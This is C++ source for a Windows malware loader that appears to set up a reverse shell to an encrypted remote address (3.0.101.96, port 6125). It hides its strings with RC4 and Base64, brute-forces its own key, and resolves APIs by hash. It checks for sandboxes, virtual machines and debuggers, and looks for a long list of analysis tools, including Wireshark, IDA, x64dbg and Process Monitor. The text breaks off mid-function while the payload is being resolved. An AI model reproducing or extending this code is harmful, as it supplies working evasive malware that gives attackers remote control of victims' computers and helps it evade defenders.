#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <cstring>
#include <vector>
#include <sstream>
#include <string>
#include <cstdint>
#include <iphlpapi.h>
#include <setupapi.h>
#include <devguid.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <strsafe.h>
#include <psapi.h>
#include <winhttp.h>
#include <shellscalingapi.h>
#include <shlobj.h>
#include <io.h>

#pragma comment(lib, "Shcore.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")

typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI *LoadLibraryFunc)(LPCSTR);
typedef HMODULE(WINAPI *GetModuleHandleW_t)(LPCWSTR);
typedef SOCKET(WINAPI *WSASocketFunc)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

using namespace std;
#define hardcodedHash 119979293

static const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

typedef NTSTATUS(NTAPI *fnNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

// Add at global scope with other declarations
PCHAR g_crackedKey = nullptr;
const std::string encryptedDevicePath = "uk6sTBTyb6d25SuPVMaqO2C8"; // RC4 encrypted + Base64 encoded "\\.\PhysicalDrive0"
const std::string encryptedProcessName = "tkDNXgHOVZtRyA+gRJqAAkg="; // RC4 encrypted + Base64 encoded "FORTRESSSHEO.EXE"
const std::string encryptedWinDbg = "sVvMVAbdOJFHww==";  // Encrypted "WINDBG.EXE"
const std::string encryptedUserAgent = "q334eSj2d/QqqHo=";     // Encrypted "Mozilla 5.0"
const std::string encryptedIpAddress = "1Ty6JWqoJvoptg==";             // Encrypted "3.0.101.96"
const std::string encryptedMethod = "oVfW";                    // Encrypted "GET"
const std::string encryptedPath = "knfxZA==";                      // Encrypted "test"
const std::string encryptedExpectedResponse = "0Cu0KQ==";  // Encrypted "6969"
const std::string encryptedWildcard = "uk6o";  // Encrypted "\*"
const std::string encryptedInternalPath = "pSjeTA3UQpFNyAuvTOicEmDhGkiE";  // Encrypted "C:\\INTERNAL\\__empty"
const std::string encryptedKernel32 = "jXfwfiH2JeYx4iaP";  // Encrypted "kernel32.dll"
const std::string encryptedMpVmp = "q2LUfTSpJJFx8jia";  // Encrypted "MpVmp32Entry"
const std::string encryptedNtdll = "iGbmfCi0crhz";  // Encrypted "ntdll.dll"
const std::string encryptedNtQueryInfo = "qGbTZSHob51x4CWRfdW3JGriOk6SusClkQ==";  // Encrypted "NtQueryInformationProcess"
const std::string encryptedWinIniPath = "pSjeTBPzeLBw8Tm/TMOqIyvlBFU="; // Encrypted "C:\\Windows\\win.ini"
const std::string encryptedPort = "0COwJQ==";  // Encrypted "6125"
const std::string encryptedBigString = "h3DhdCH8cbx27CGPfdqsPXT+GUiIr9KumzfaAwyR4Ojb8yy1je2bZChhOnq6TxqUnXHdOlQzL+PZoh03LTOmvDj2ug==";  // Encrypted alphabet string
const std::string encryptedKey = "rQ==";  // Encrypted 'K'

const std::string encryptedDevices[] = {
    "sFDNSA==",     // Encrypted from "VBOX"
    "sF/VURbf",     // Encrypted from "VMWARE"
    "sFvQRBHbWg==", // Encrypted from "VIRTUAL"
    "t1fPRQ=="      // Encrypted from "QEMU"
};

const std::string encryptedProcesses[] = {
    "tkDNUwHCRvpa3g8=",           // PROCEXP.EXE
    "tkDNUwHCRuIrqA+7VQ==",       // PROCEXP64.EXE
    "slHSRg3fQfpa3g8=",           // TCPVIEW.EXE
    "slHSRg3fQeIrqA+7VQ==",       // TCPVIEW64.EXE
    "tkDNUwnVWPpa3g8=",           // PROCMON.EXE
    "tkDNUwnVWOIrqA+7VQ==",       // PROCMON64.EXE
    "sF/PURS0U4xa",               // VMMAP.EXE
    "sF/PXQXKIOAxwxKm",           // VMMMAP64.EXE
    "tl3QRAnVWPpa3g8=",           // PORTMON.EXE
    "tkDNUwHJRZhe1RmsPvGbCA==",   // PROCESSLASSO.EXE
    "sVvQVRfSV4ZUqA+7VQ==",       // WIRESHARK.EXE
    "oFvGVAjfRPpa3g8=",           // FIDDLER.EXE
    "r1bDPgHCUw==",               // IDA.EXE
    "r1bDJnC0U4xa",               // IDA64.EXE
    "r1/PRQrTQo1bwwi2V/OGHyvJMnk=", // IMMUNITYDEBUGGER.EXE
    "sVvMVBHXRvpa3g8=",           // WINDUMP.EXE
    "viS2VAbdOJFHww==",           // X64DBG.EXE
    "viGwVAbdOJFHww==",           // X32DBG.EXE
    "qV7OSQDYUfpa3g8=",           // OLLYDBG.EXE
    "tkDNUwHJRZxexQGmQpqGFUA=",   // PROCESSHACKER.EXE
    "r1bDQWrfTpE=",               // IDAQ.EXE
    "r1bDQXKuOJFHww==",           // IDAQ64.EXE
    "p0fWXxbPWIcxwxKm",           // AUTORUNS.EXE
    "okfPQAfbRvpa3g8=",           // DUMPCAP.EXE
    "ole2VAvOOJFHww==",           // DE4DOT.EXE
    "rl3NWwHCRphQ1A+xPvGbCA==",   // HOOKEXPLORER.EXE
    "r17RQB20U4xa",               // ILSPY.EXE
    "ql3QVBTfOJFHww==",           // LORDPE.EXE
    "olzRQB20U4xa",               // DNSPY.EXE
    "tlfWXwvWRfpa3g8=",           // PETOOLS.EXE
    "p0fWXxbPWIdcqA+7VQ==",       // AUTORUNSC.EXE
    "tFfRXxHIVZFXxwmoVebtCF3J",   // RESOURCEHACKER.EXE
    "oFvOVQnVWPpa3g8=",           // FILEMON.EXE
    "tFfFXQvUOJFHww==",           // REGMON.EXE
    "sVvMVAbdOJFHww=="            // WINDBG.EXE
};



std::string base64_decode(const std::string &in)
{
    std::string out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++)
        T[base64_chars[i]] = i;

    int val = 0, valb = -8;
    for (unsigned char c : in)
    {
        if (T[c] == -1)
            break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0)
        {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

string deObfuscation(const vector<int> &offsets, const char *big_string)
{
    string result;
    for (int offset : offsets)
    {
        result += big_string[offset];
    }
    return result;
}

string simpleXOR(const string &data, char key)
{
    string result = data;
    for (size_t i = 0; i < data.size(); i++)
    {
        result[i] = data[i] ^ key;
    }
    return result;
}

string decodeString(const int *encoded, int size, const char *big_string, char key)
{

    string base64Encoded;
    for (int i = 0; i < size; i++)
    {
        base64Encoded += big_string[encoded[i]];
    }


    string decoded = base64_decode(base64Encoded);


    string decrypted = simpleXOR(decoded, key);


    vector<int> decryptedOffsets;
    stringstream ss(decrypted);
    string token;
    while (getline(ss, token, ','))
    {
        if (!token.empty())
        {
            decryptedOffsets.push_back(stoi(token));
        }
    }


    return deObfuscation(decryptedOffsets, big_string);
}

int complexDummyFunction(int a, int b)
{
    int result = 0;
    for (int i = 0; i < 1000; i++)
    {
        result += (a * i) ^ (b << 2);
        if (i % 7 == 0)
            result ^= 0xdeadbeef;
    }
    return result;
}

uint32_t GetHash(const std::string &functionName)
{
    uint32_t hash = 0;
    for (char c : functionName)
    {
        hash = (hash >> 13) | (hash << 19); 
        hash += c;
    }
    return hash;
}

void RC4(PCHAR key, PCHAR input, PCHAR output, DWORD length) {
    unsigned char S[256];
    int len = strlen(key);
    int j = 0;
    unsigned char tmp;
    for (int i = 0; i < 256; i++)
        S[i] = i;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + ((PUCHAR)key)[i % len]) % 256;
        tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }
    int i = 0;
    j = 0;
    for (int n = 0; n < length; n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
        int rnd = S[(S[i] + S[j]) % 256];
        ((PUCHAR)output)[n] = rnd ^ ((PUCHAR)input)[n];
    }
}

unsigned int djb2Hash(const char* data, DWORD dataLength) {
    DWORD hash = 9876;
    for (int i = 0; i < dataLength; i++) {
        hash = ((hash << 5) + hash) + ((PBYTE)data)[i];
    }
    return hash;
}

PCHAR RecursiveCrack(PCHAR encryptedData, int encryptedDataLength, PCHAR key, int level) {
    char keySpace[] = "\x00""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    PCHAR decryptedData = new char[encryptedDataLength + 1]();
    for (int i = 0; i < sizeof(keySpace) - 1; i++) {
        // printf("Trying key: %s\n", key);
        if (level == 16) {
            if (!i) i++;
            key[16 - level] = keySpace[i];
            RC4(key, encryptedData, decryptedData, encryptedDataLength);

            if (djb2Hash(decryptedData, encryptedDataLength) == hardcodedHash) return key;
            if (i == sizeof(keySpace) - 2) return NULL;
        }
        else {
            key[16 - level] = keySpace[i];
            if (RecursiveCrack(encryptedData, encryptedDataLength, key, level + 1) != NULL) return key;
            else continue;
        }
    }
    delete[] decryptedData;
    return NULL;
}

PCHAR CrackKey(PCHAR encryptedData, int encryptedDataLength) {
    printf("Cracking key...\n");
    PCHAR key = new char[16]();
    RecursiveCrack(encryptedData, encryptedDataLength, key, 1);
    printf("Key: %s\n", key);
    return key;
}

// Function to initialize the key once
void initializeGlobalKey(PCHAR encryptedData, int encryptedDataLength) {
    printf("Initializing global key...\n");
    if (!g_crackedKey) {
        g_crackedKey = CrackKey(encryptedData, encryptedDataLength);
    }
}

wchar_t* decodeAndDecryptToWide(const std::string& encryptedString) {
    std::string decoded = base64_decode(encryptedString);
    size_t encryptedLength = decoded.length();
    
    char* decrypted = new char[encryptedLength + 1]();  // Zero-initialize the buffer
    RC4(g_crackedKey, (PCHAR)decoded.c_str(), decrypted, encryptedLength);
    decrypted[encryptedLength] = '\0';  // Explicitly null terminate
    
    size_t wideStrLength = encryptedLength + 1;
    wchar_t* wideStr = new wchar_t[wideStrLength]();
    
    // Convert to wide string and check for conversion errors
    size_t convertedChars = mbstowcs(wideStr, decrypted, encryptedLength);
    if (convertedChars == static_cast<size_t>(-1)) {
        delete[] decrypted;
        delete[] wideStr;
        return nullptr;  // Return null if conversion failed
    }
    
    delete[] decrypted;
    return wideStr;
}


// Kiểm tra tài nguyên hệ thống
bool checkSystemResources()
{
    // Less than 2 processors
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2)
        return false;

    // Less than 2 gb of ram
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 2048)
        return false;

    wchar_t* widePath = decodeAndDecryptToWide(encryptedDevicePath);
    HANDLE hDevice = CreateFileW(widePath, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    delete[] widePath;

    if (hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    if (!DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, NULL))
    {
        printf("Failed to get disk geometry\n");
        CloseHandle(hDevice);
        return false;
    }

    DWORD diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder *
                       (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    CloseHandle(hDevice);
    if (diskSizeGB < 100)
        return false;

    return true;
}

bool CheckHDDName()
{
    HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);
    if (hDeviceInfo == INVALID_HANDLE_VALUE)
        return true;

    SP_DEVINFO_DATA deviceInfoData;
    deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);

    if (!SetupDiEnumDeviceInfo(hDeviceInfo, 0, &deviceInfoData))
        return true;

    DWORD propertyBufferSize = 0;
    SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &propertyBufferSize);
    PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);

    if (HDDName)
    {
        SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);
        CharUpperW(HDDName);

        for (const std::string& encryptedDevice : encryptedDevices)
        {
            wchar_t* decryptedDevice = decodeAndDecryptToWide(encryptedDevice);
            if (wcsstr(HDDName, decryptedDevice))
            {
                delete[] decryptedDevice;
                HeapFree(GetProcessHeap(), 0, HDDName);
                return false;
            }
            delete[] decryptedDevice;
        }
        HeapFree(GetProcessHeap(), 0, HDDName);
    }
    return true;
}

bool CheckApplicationName()
{
    wchar_t currentProcessPath[MAX_PATH + 1];
    GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);
    CharUpperW(currentProcessPath);
    wchar_t* wideName = decodeAndDecryptToWide(encryptedProcessName);
    bool result = (wcsstr(currentProcessPath, wideName) != nullptr);
    delete[] wideName;  
    return result;
}

bool CheckSuspiciousProcesses()
{
    PROCESSENTRY32W processEntry = {0};
    processEntry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    WCHAR processName[MAX_PATH + 1];

    if (Process32FirstW(hSnapshot, &processEntry))
    {
        do
        {
            StringCchCopyW(processName, MAX_PATH, processEntry.szExeFile);
            CharUpperW(processName);

            for (const std::string& encryptedProcess : encryptedProcesses)
            {
                wchar_t* decryptedProcess = decodeAndDecryptToWide(encryptedProcess);
                if (wcsstr(processName, decryptedProcess))
                {
                    delete[] decryptedProcess;
                    CloseHandle(hSnapshot);
                    return false;
                }
                delete[] decryptedProcess;
            }
        } while (Process32NextW(hSnapshot, &processEntry));
    }

    CloseHandle(hSnapshot);
    return true;
}

DWORD GetParentPID(DWORD pid)
{
    DWORD ppid = 0;
    PROCESSENTRY32W processEntry = {0};
    processEntry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32FirstW(hSnapshot, &processEntry))
    {
        do
        {
            if (processEntry.th32ProcessID == pid)
            {
                ppid = processEntry.th32ParentProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &processEntry));
    }
    CloseHandle(hSnapshot);
    return ppid;
}

bool CheckParentProcess()
{
    DWORD parentPid = GetParentPID(GetCurrentProcessId());
    WCHAR parentName[MAX_PATH + 1];
    DWORD dwParentName = MAX_PATH;
    HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
    if (hParent == NULL)
        return false;

    if (QueryFullProcessImageNameW(hParent, 0, parentName, &dwParentName))
    {
        CloseHandle(hParent);
        CharUpperW(parentName);
        
        wchar_t* decryptedWinDbg = decodeAndDecryptToWide(encryptedWinDbg);
        bool result = !wcsstr(parentName, decryptedWinDbg);
        delete[] decryptedWinDbg;
        return result;
    }
    else
    {
        CloseHandle(hParent);
        return false;
    }
}

DWORD g_dwMouseClicks = 0x00;
HHOOK g_hMouseHook = 0x00;
DWORD g_dwLastPrintTime = 0;
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN)
    {
        g_dwMouseClicks++;
        printf("Mouse clicks: %d\n", g_dwMouseClicks);

        if (g_dwMouseClicks >= 5)
        {

            UnhookWindowsHookEx(g_hMouseHook);
            PostQuitMessage(0); 
        }
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL IsVirtualEnvUserInteraction(IN DWORD dwMonitorTimeInSec, IN OPTIONAL DWORD dwNmbrOfMouseClicks)
{
    DWORD dwMouseClicks = 5; 

    if (!dwMonitorTimeInSec)
        return true;

    if (dwNmbrOfMouseClicks && dwNmbrOfMouseClicks > 1)
        dwMouseClicks = dwNmbrOfMouseClicks;

    g_dwMouseClicks = 0;

    if (!(g_hMouseHook = SetWindowsHookExW(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0)))
    {
        printf("[!] SetWindowsHookExW Failed With Error: %d \n", GetLastError());
        return false;
    }

    MSG Msg;
    DWORD startTime = GetTickCount();
    while (GetTickCount() - startTime <= dwMonitorTimeInSec * 1000)
    {
        if (PeekMessage(&Msg, NULL, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&Msg);
            DispatchMessage(&Msg);
        }

        if (g_dwMouseClicks >= dwMouseClicks)
        {
            UnhookWindowsHookEx(g_hMouseHook);
            return true; 
        }
    }

    UnhookWindowsHookEx(g_hMouseHook);
    return false; 
}

bool CheckRecentFiles()
{
    PWSTR recentFolder = NULL;
    SHGetKnownFolderPath(FOLDERID_Recent, 0, NULL, &recentFolder);
    wchar_t recentFolderFiles[MAX_PATH + 1] = L"";
    StringCbCatW(recentFolderFiles, MAX_PATH, recentFolder);
    
    wchar_t* wildcard = decodeAndDecryptToWide(encryptedWildcard);
    StringCbCatW(recentFolderFiles, MAX_PATH, wildcard);
    delete[] wildcard;
    int numberOfRecentFiles = 0;
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW(recentFolderFiles, &findFileData);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            numberOfRecentFiles++;
        } while (FindNextFileW(hFind, &findFileData));
        FindClose(hFind);
    }
    CoTaskMemFree(recentFolder);
    if (numberOfRecentFiles >= 2)
        numberOfRecentFiles -= 2; // exclude '.' and '..'
    return numberOfRecentFiles >= 20;
    // Rest of the function remains same
}

bool checkForInternalFile()
{
    wchar_t* internalPath = decodeAndDecryptToWide(encryptedInternalPath);
    bool result = (_waccess(internalPath, 0) == -1);
    delete[] internalPath;
    return result;
}

bool checkSuspiciousImport()
{
    wchar_t* kernel32 = decodeAndDecryptToWide(encryptedKernel32);
    HMODULE hKernel32 = GetModuleHandleW(kernel32);
    delete[] kernel32;
    
    if (hKernel32 == NULL) {
        return false;
    }
    
    wchar_t* mpVmpWide = decodeAndDecryptToWide(encryptedMpVmp);
    char mpVmp[MAX_PATH];
    wcstombs(mpVmp, mpVmpWide, MAX_PATH);
    bool result = (GetProcAddress(hKernel32, mpVmp) == NULL);
    delete[] mpVmpWide;

    return result;
}

bool checkSufficientProcesses()
{
    DWORD processIds[1024];
    DWORD bytesReturned;
    if (!EnumProcesses(processIds, sizeof(processIds), &bytesReturned))
    {
        return false;
    }

    DWORD processCount = bytesReturned / sizeof(DWORD);
    printf("Number of running processes: %d\n", processCount);


    return (processCount >= 50);
}

bool checkSufficientUptime()
{
    ULONGLONG uptimeSeconds = GetTickCount64() / 1000;
    ULONGLONG uptimeMinutes = uptimeSeconds / 60;
    
    printf("System uptime: %llu minutes\n", uptimeMinutes);


    return (uptimeMinutes >= 25);
}

// anti-debugging
bool checkNotBeingDebugged()
{
    PPEB pPEB = (PPEB)__readgsqword(0x60);
    
    if (pPEB->BeingDebugged)
    {
        printf("Debugger detected\n");
        return false;
    }
    
    printf("No debugger detected\n");
    return true;
}

// sus
bool checkNoDebugPort()
{
    typedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(
        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

    wchar_t* ntdll = decodeAndDecryptToWide(encryptedNtdll);
    char* ntQueryInfo = new char[MAX_PATH];
    wchar_t* ntQueryInfoWide = decodeAndDecryptToWide(encryptedNtQueryInfo);
    wcstombs(ntQueryInfo, ntQueryInfoWide, MAX_PATH);

    PNtQueryInformationProcess NtQueryInformationProcess =
        (PNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleW(ntdll),
            ntQueryInfo
        );

    delete[] ntdll;
    delete[] ntQueryInfo;
    delete[] ntQueryInfoWide;

    if (NtQueryInformationProcess == NULL)
    {
        printf("Failed to get NtQueryInformationProcess\n");
        return false;
    }

    DWORD64 debugPort = 0;
    NTSTATUS status = NtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessDebugPort,
        &debugPort,
        sizeof(debugPort),
        NULL
    );

    if (NT_SUCCESS(status) && debugPort == 0)
    {
        printf("No debug port detected\n");
        return true;
    }
    
    printf("Debug port detected\n");
    return false;
}

bool checkNtGlobalFlag()
{
    #define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
    #define FLG_HEAP_ENABLE_FREE_CHECK   0x20
    #define FLG_HEAP_VALIDATE_PARAMETERS 0x40
    #define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)

    PDWORD pNtGlobalFlag = (PDWORD)(__readgsqword(0x60) + 0xBC);
    
    if ((*pNtGlobalFlag) & NT_GLOBAL_FLAG_DEBUGGED)
    {
        printf("Debugger flags detected in NtGlobalFlag\n");
        return false;
    }
    
    printf("No debugger flags detected in NtGlobalFlag\n");
    return true;
}

bool checkHeapFlags()
{
    PDWORD pHeapFlags = (PDWORD)((PBYTE)GetProcessHeap() + 0x70);
    PDWORD pHeapForceFlags = (PDWORD)((PBYTE)GetProcessHeap() + 0x74);
    
    if ((*pHeapFlags & HEAP_GROWABLE) == 0 || *pHeapForceFlags != 0)
    {
        printf("Suspicious heap flags detected\n");
        return false;
    }
    
    printf("Heap flags appear normal\n");
    return true;
}

// sus
bool checkDebugArtifacts()
{
    typedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(
        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

    wchar_t* ntdll = decodeAndDecryptToWide(encryptedNtdll);
    char* ntQueryInfo = new char[MAX_PATH];
    wchar_t* ntQueryInfoWide = decodeAndDecryptToWide(encryptedNtQueryInfo);
    wcstombs(ntQueryInfo, ntQueryInfoWide, MAX_PATH);

    PNtQueryInformationProcess NtQueryInformationProcess =
        (PNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleW(ntdll),
            ntQueryInfo
        );

    delete[] ntdll;
    delete[] ntQueryInfo;
    delete[] ntQueryInfoWide;

    if (NtQueryInformationProcess == NULL)
    {
        printf("Failed to get NtQueryInformationProcess\n");
        return false;
    }

    HANDLE hProcessDebugObject = NULL;
    DWORD processDebugFlags = 0;
    NTSTATUS status;

    status = NtQueryInformationProcess(
        GetCurrentProcess(),
        (PROCESSINFOCLASS)0x1E, 
        &hProcessDebugObject,
        sizeof(HANDLE),
        NULL
    );

    if (NT_SUCCESS(status) && hProcessDebugObject != NULL)
    {
        printf("Debug object handle detected\n");
        return false;
    }

    status = NtQueryInformationProcess(
        GetCurrentProcess(),
        (PROCESSINFOCLASS)0x1F,
        &processDebugFlags,
        sizeof(DWORD),
        NULL
    );

    if (NT_SUCCESS(status) && processDebugFlags == 0)
    {
        printf("Debug flags indicate debugging\n");
        return false;
    }

    printf("No debug artifacts detected\n");
    return true;
}

bool checkDebugRegisters()
{
    CONTEXT context = {};
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    if (!GetThreadContext(GetCurrentThread(), &context))
    {
        printf("Failed to get thread context\n");
        return false;
    }
    
    if (context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0)
    {
        printf("Debug registers are set\n");
        return false;
    }
    
    printf("No debug registers are set\n");
    return true;
}

void executePayload()
{
    wchar_t* decryptedBigString = decodeAndDecryptToWide(encryptedBigString);
    size_t convertedSize;
    char* big_string = new char[wcslen(decryptedBigString) + 1];
    wcstombs_s(&convertedSize, big_string, wcslen(decryptedBigString) + 1, decryptedBigString, _TRUNCATE);

    wchar_t* decryptedKey = decodeAndDecryptToWide(encryptedKey);
    char key = (char)*decryptedKey;

    delete[] decryptedBigString;
    delete[] decryptedKey;


    int c_p_o[] = {4, 49, 39, 13, 4, 13, 23, 13, 5, 56, 3, 61, 51, 57, 15, 24, 51, 57, 63, 13, 5, 57, 15, 13, 4, 13, 23, 13, 4, 13, 63, 13, 4, 48, 3, 65, 51, 57, 15, 25, 51, 57, 15, 25, 51, 57, 11, 63, 51, 22, 64, 64};                                           
    int w_s_o[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 5, 57, 63, 13, 4, 13, 35, 13, 4, 56, 3, 60, 5, 32, 3, 60, 2, 12, 3, 59, 4, 56, 3, 60, 5, 12, 2, 64};                                                                                                   
    int w_c_o[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 4, 49, 39, 13, 4, 13, 63, 13, 4, 13, 7, 13, 4, 13, 7, 13, 5, 56, 3, 59, 51, 57, 15, 24, 51, 22, 64, 64};                                                                                                 
    int w_soc_offset[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 5, 57, 63, 13, 4, 13, 63, 13, 4, 48, 3, 60, 4, 56, 3, 65, 51, 57, 15, 24, 51, 22, 64, 64};                                                                                                    
    int h_t_o[] = {5, 32, 3, 60, 2, 12, 3, 60, 5, 56, 3, 60, 4, 32, 3, 60, 2, 56, 2, 64};                                                                                                                                                                            
    int i_a_o[] = {2, 56, 3, 60, 4, 32, 3, 65, 51, 57, 15, 24, 51, 57, 59, 58, 51, 57, 19, 13, 4, 32, 3, 58, 51, 57, 15, 62, 51, 22, 64, 64};                                                                                                                      
    int w_s_a_o[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 5, 57, 63, 13, 4, 13, 63, 13, 4, 48, 3, 60, 4, 56, 3, 65, 51, 57, 15, 24, 51, 57, 11, 63, 51, 22, 64, 64};                                                                                           
    int w_f_s_o_o[] = {5, 57, 39, 13, 4, 56, 3, 25, 51, 57, 15, 24, 51, 57, 7, 60, 51, 57, 15, 65, 51, 57, 15, 62, 51, 57, 63, 65, 51, 57, 39, 13, 4, 13, 7, 13, 5, 48, 3, 60, 4, 12, 3, 65, 51, 57, 63, 61, 51, 57, 15, 13, 2, 12, 3, 65, 51, 57, 11, 13, 4, 13, 35, 13}; 
    int ipaddr_offset[] = { 5, 13, 23, 13, 5, 13, 11, 13, 5, 49, 11, 13, 5, 13, 35, 13, 5, 13, 11, 13, 5, 13, 55, 13, 5, 13, 63, 13, 5, 13, 11, 13, 5, 49, 19, 13, 5, 13, 63, 13 };
    int exe_c_m_d[] = {4, 48, 3, 60, 4, 48, 3, 58, 51, 57, 59, 59, 51, 57, 63, 13, 4, 49, 7, 13, 5, 56, 2, 64};                                                                                                                         
    wchar_t* decryptedPort = decodeAndDecryptToWide(encryptedPort);
    short port = (short)_wtoi(decryptedPort);
    delete[] decryptedPort;
    int w_s_2_32lld[] = {4, 49, 11, 13, 4, 13, 39, 13, 5, 13, 55, 13, 5, 13, 7, 13, 5, 13, 23, 13, 5, 13, 55, 13, 5, 13, 11, 13, 4, 32, 3, 60, 4, 12, 3, 60, 4, 12, 2, 64};                                                                         
    int k_renel_32[] = {4, 13, 19, 13, 5, 56, 3, 60, 5, 32, 3, 60, 4, 32, 3, 65, 51, 57, 15, 60, 51, 57, 59, 62, 51, 57, 59, 63, 51, 57, 59, 59, 51, 57, 7, 13, 4, 13, 15, 13, 4, 13, 15, 13};                                                       
    int get_proc_addr[] = {4, 33, 11, 13, 5, 56, 3, 60, 2, 12, 3, 65, 4, 12, 3, 60, 5, 32, 3, 60, 5, 56, 3, 59, 51, 57, 11, 63, 51, 57, 7, 13, 4, 32, 3, 60, 5, 32, 3, 65, 51, 57, 15, 25, 51, 57, 15, 25, 51, 22, 64, 64};                    
    int g_et_mod_u_l_o_handelW[] = {4, 33, 11, 13, 5, 56, 3, 60, 2, 12, 3, 58, 2, 56, 3, 60, 5, 56, 3, 58, 51, 57, 11, 61, 51, 57, 15, 60, 51, 57, 63, 13, 4, 33, 7, 13, 4, 56, 3, 60, 4, 32, 3, 58, 51, 57, 15, 60, 51, 57, 63, 13, 5, 57, 39, 13}; 
    
    HMODULE w_s2_32lib = LoadLibraryA(decodeString(w_s_2_32lld, sizeof(w_s_2_32lld) / sizeof(w_s_2_32lld[0]), big_string, key).c_str());

    HMODULE ker_nel_32lld = LoadLibraryA(decodeString(k_renel_32, sizeof(k_renel_32) / sizeof(k_renel_32[0]), big_string, key).c_str());

    uint32_t targetHash = GetHash(decodeString(get_proc_addr, sizeof(get_proc_addr) / sizeof(get_proc_addr[0]), big_string, key).c_str());

    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)ker_nel_32lld;
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE *)ker_nel_32lld + pDOSHeader->e_lfanew);
    DWORD exportDirectoryRVA = pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;


